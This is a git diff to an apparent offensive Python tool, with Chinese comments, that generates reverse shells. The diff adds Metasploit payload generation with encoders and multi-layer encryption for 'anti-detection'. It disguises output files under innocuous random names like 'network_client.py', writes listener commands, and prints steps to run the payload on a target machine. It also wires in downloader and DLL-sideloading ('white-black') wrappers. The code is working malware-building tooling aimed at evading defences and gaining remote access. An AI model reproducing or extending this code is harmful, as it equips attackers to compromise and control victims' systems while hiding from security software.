@@ -13,6 +13,7 @@ GitHub: https://github.com/sysfox
 
 import sys
 import os
+import random
 
 # 导入模块
 from modules import (
@@ -20,6 +21,7 @@ from modules import (
     gene_code, gene_code_obfuscated, advanced_obfuscate_code,
     gene_shell, create_payload_dropper, create_downloader,
     create_white_black_payload, create_dll_sideloading_payload, create_hijacking_payload,
+    MSFIntegration, create_msf_shell_wrapper, get_msf_config_recommendations,
     validate_ip, validate_port, create_config_file, print_results,
     interactive_mode, command_line_mode
 )
@@ -47,7 +49,12 @@ def main():
                 'use_downloader': args.use_downloader,
                 'download_url': args.download_url,
                 'downloader_silent': args.downloader_silent,
-                'silent_delay': args.silent_delay
+                'silent_delay': args.silent_delay,
+                'use_msf': args.use_msf,
+                'msf_payload': args.msf_payload,
+                'msf_encoder': args.msf_encoder,
+                'msf_iterations': args.msf_iterations,
+                'msf_format': args.msf_format
             }
             quiet = args.quiet
         else:
@@ -69,6 +76,150 @@ def main():
         
         if not quiet:
             print("\n🔧 正在生成Shell...")
+        
+        # 检查是否使用MSF载荷
+        if config.get('use_msf', False):
+            # MSF载荷生成模式
+            try:
+                msf = MSFIntegration()
+                if not msf.is_available():
+                    print("❌ MSF/msfvenom 不可用，将使用标准反弹Shell")
+                    config['use_msf'] = False
+                else:
+                    if not quiet:
+                        print("🎯 正在生成MSF载荷...")
+                    
+                    # 生成MSF载荷
+                    payload_data, msf_command = msf.generate_payload(
+                        payload_type=config['msf_payload'],
+                        ip=config['ip'],
+                        port=config['port'],
+                        format_type=config['msf_format'],
+                        encoder=config.get('msf_encoder'),
+                        iterations=config.get('msf_iterations', 3)
+                    )
+                    
+                    # 创建MSF载荷包装器
+                    msf_wrapper_code = create_msf_shell_wrapper(
+                        payload_data=payload_data,
+                        format_type=config['msf_format'],
+                        anti_detection=config['anti_detection'],
+                        obfuscate=True
+                    )
+                    
+                    # 可选加密MSF载荷
+                    if config['anti_detection']:
+                        key = gene_advanced_key(config['key_length'])
+                        cipher = AdvancedCipher(key)
+                        encrypted_code = cipher.multi_layer_encrypt(msf_wrapper_code)
+                        
+                        # 生成加密的MSF Shell文件
+                        filepath = gene_shell(
+                            encrypted_code, 
+                            key, 
+                            config['output_dir'], 
+                            config['filename'],
+                            config['persistence'],
+                            config['anti_detection'],
+                            config.get('silent_delay', 30)
+                        )
+                    else:
+                        # 直接保存MSF包装器  
+                        if config['filename']:
+                            filename = config['filename']
+                        else:
+                            msf_names = [
+                                "msf_client.py", "network_client.py", "system_client.py",
+                                "remote_access.py", "connection_manager.py"
+                            ]
+                            filename = random.choice(msf_names)
+                        
+                        filepath = os.path.join(config['output_dir'], filename)
+                        with open(filepath, 'w', encoding='utf-8') as f:
+                            f.write(msf_wrapper_code)
+                        
+                        key = "MSF_RAW_PAYLOAD"  # 标识符
+                    
+                    # 创建配置文件
+                    config_path = create_config_file(config['ip'], config['port'], key, filepath)
+                    
+                    # 生成监听器命令
+                    listener_cmd = msf.create_listener_command(
+                        config['msf_payload'], 
+                        config['ip'], 
+                        config['port']
+                    )
+                    
+                    # 保存监听器命令到文件
+                    listener_file = os.path.join(config['output_dir'], "listener_commands.txt")
+                    with open(listener_file, 'w', encoding='utf-8') as f:
+                        f.write(listener_cmd)
+                        f.write(f"\n\n# MSF生成命令:\n# {msf_command}")
+                    
+                    # 打印结果
+                    if not quiet:
+                        print(f"\n✅ MSF载荷生成成功！")
+                        print(f"📁 MSF载荷文件: {filepath}")
+                        print(f"📁 配置文件: {config_path}")
+                        print(f"📁 监听器命令: {listener_file}")
+                        print(f"🎯 载荷类型: {config['msf_payload']}")
+                        print(f"🔧 编码器: {config.get('msf_encoder', '无')}")
+                        print(f"📋 输出格式: {config['msf_format']}")
+                        print(f"🎧 监听器: 查看 {listener_file} 获取监听命令")
+                        
+                        if 'meterpreter' in config['msf_payload']:
+                            print(f"\n⚠️  Meterpreter使用说明:")
+                            print(f"   1. 使用msfconsole启动监听器")
+                            print(f"   2. 在目标机器上运行: python3 {filepath}")
+                            print(f"   3. 等待Meterpreter会话建立")
+                        else:
+                            print(f"\n⚠️  Shell使用说明:")
+                            print(f"   1. 监听命令: nc -lvnp {config['port']}")
+                            print(f"   2. 在目标机器上运行: python3 {filepath}")
+                    
+                    # 如果启用了下载器模式，也为MSF生成下载器
+                    if config.get('use_downloader', False):
+                        if not config.get('download_url'):
+                            print("❌ 下载器模式需要指定下载URL")
+                        else:
+                            # 生成MSF下载器
+                            downloader_filepath = create_downloader(
+                                config['download_url'],
+                                config.get('downloader_silent', True),
+                                config['output_dir'],
+                                filename=None
+                            )
+                            
+                            if not quiet:
+                                print(f"📁 MSF下载器文件: {downloader_filepath}")
+                                print(f"🔗 下载URL: {config['download_url']}")
+                    
+                    # 白加黑技术 (如果启用)
+                    if config.get('use_white_black', False):
+                        if not quiet:
+                            print("\n🎭 正在为MSF载荷生成白加黑包装...")
+                        
+                        try:
+                            if config['white_black_mode'] == 'wrapper':
+                                wb_filepath, wb_description = create_white_black_payload(
+                                    encrypted_code if config['anti_detection'] else msf_wrapper_code, 
+                                    key if config['anti_detection'] else "MSF_WRAPPER", 
+                                    config['output_dir'], "auto"
+                                )
+                                if not quiet:
+                                    print(f"✅ MSF白加黑载荷生成成功!")
+                                    print(f"📁 白加黑文件: {wb_filepath}")
+                                    print(f"📋 包装类型: {wb_description}")
+                                    
+                        except Exception as e:
+                            print(f"❌ MSF白加黑载荷生成失败: {str(e)}")
+                    
+                    return  # MSF模式完成，退出
+                    
+            except Exception as e:
+                print(f"❌ MSF载荷生成失败: {str(e)}")
+                print("💡 将回退到标准反弹Shell模式")
+                config['use_msf'] = False
         
         # 检查是否使用下载器模式
         if config.get('use_downloader', False):
